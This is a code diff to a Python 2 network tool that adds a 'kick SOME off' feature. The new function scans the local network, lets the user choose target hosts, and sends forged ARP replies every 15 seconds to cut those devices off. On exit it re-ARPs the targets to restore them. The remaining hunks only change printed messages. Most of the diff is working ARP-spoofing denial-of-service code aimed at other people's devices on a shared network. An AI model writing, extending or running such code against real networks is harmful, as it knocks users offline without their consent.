@@ -38,6 +38,7 @@ def heading():
 
 def optionBanner():
     print('\nChoose option from menu:\n')
+    sleep(0.2)
     print('\t{0}[{1}1{2}]{3} Kick ONE Off').format(YELLOW, RED, YELLOW, WHITE)
     sleep(0.2)
     print('\t{0}[{1}2{2}]{3} Kick SOME Off').format(YELLOW, RED, YELLOW, WHITE)
@@ -115,7 +116,66 @@ def kickoneoff():
 
 
 def kicksomeoff():
-    print('kicksomeoff')
+    os.system("clear||cls")
+
+    print("\n{0}kickSOMEOff{1} selected...{2}\n").format(RED, GREEN, END)
+    scanNetwork()
+
+    print("Online IPs: ")
+
+    for i in range(len(onlineIPs)):
+        mac = ""
+        for host in hostsList:
+            if host[0] == onlineIPs[i]:
+                mac = host[1]
+        vendor = resolveMac(mac)
+        print("  [{0}" + str(i) + "{1}] {2}" + str(onlineIPs[i]) + "{3}\t" + vendor + "\n{4}").format(YELLOW, WHITE,
+                                                                                                      RED, GREEN, END)
+
+    canBreak = False
+    while not canBreak:
+        try:
+            choice = raw_input("\nChoose the targets (separate by a ','): ")
+            canBreak = True
+        except KeyboardInterrupt:
+            return
+
+    some_targets = choice.split(",")
+
+    some_ipList = ""
+    for i in some_targets:
+        try:
+            some_ipList = some_ipList + GREEN + "'" + RED + onlineIPs[int(i)] + GREEN + "', "
+        except KeyboardInterrupt:
+            return
+        except:
+            print("\n{0}ERROR: '{1}" + i + "{2}' is not in the list.{3}\n").format(RED, GREEN, RED, END)
+            return
+    some_ipList = some_ipList[:-2] + END
+
+    print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)
+
+    print("\n{0}Spoofing started... {1}\n").format(GREEN, END)
+    try:
+        while True:
+            for i in some_targets:
+                ip = onlineIPs[int(i)]
+                for host in hostsList:
+                    if host[0] == ip:
+                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
+            time.sleep(15)
+    except KeyboardInterrupt:
+        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
+        rearp = 1
+        while rearp != 10:
+            for i in some_targets:
+                ip = onlineIPs[int(i)]
+                for host in hostsList:
+                    if host[0] == ip:
+                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
+            rearp = rearp + 1
+            time.sleep(0.5)
+        print("\n{0}Re-arped{1} targets.{2}").format(RED, GREEN, END)
 
 
 def kickalloff():
@@ -146,7 +206,7 @@ def kickalloff():
                 scanNetwork()
             time.sleep(15)
     except KeyboardInterrupt:
-        print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
+        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
         rearp = 1
         while rearp != 10:
             for host in hostsList:
@@ -154,9 +214,7 @@ def kickalloff():
                     spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
             rearp = rearp + 1
             time.sleep(0.5)
-        print("\n{0}Re-arped{1} target.{2}").format(RED, GREEN, END)
-
-
+        print("\n{0}Re-arped{1} targets.{2}").format(RED, GREEN, END)
 
 
 def getDefaultInterface():
@@ -209,6 +267,7 @@ def resolveMac(mac):
         return "RESOLVING_ERROR"
 
 def main():
+
     heading()
 
     print(
@@ -227,8 +286,8 @@ def main():
             choice = raw_input(header)
 
             if choice.upper() == 'E' or choice.upper() == 'EXIT':
-                print('Thanks for dropping by!')
-                print('Catch ya later!')
+                print('\n{0}Thanks for dropping by.'
+                      '\nCatch ya later!{1}').format(GREEN, END)
                 raise SystemExit
             elif choice == '1':
                 kickoneoff()
@@ -245,8 +304,8 @@ def main():
                 # print('*INVALID OPTION*')
 
     except KeyboardInterrupt:
-        print('\nThanks for dropping by.'
-              '\nCatch ya later!{0}').format(END)
+        print('\n\n{0}Thanks for dropping by.'
+              '\nCatch ya later!{1}').format(GREEN, END)
 
 
 if __name__ == '__main__':
